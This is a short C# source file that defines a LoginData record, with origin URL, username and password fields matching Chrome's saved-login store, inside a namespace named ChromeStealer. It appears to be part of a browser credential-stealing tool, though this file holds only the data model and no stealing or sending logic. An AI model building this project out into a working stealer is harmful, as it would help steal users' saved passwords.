namespace ChromeStealer.Models
{
    public record LoginData
    (
        int Id,
        string OriginUrl,
        string ActionUrl,
        string UsernameElement,
        string UsernameValue,
        string PasswordElement,
        string PasswordValue
    );
}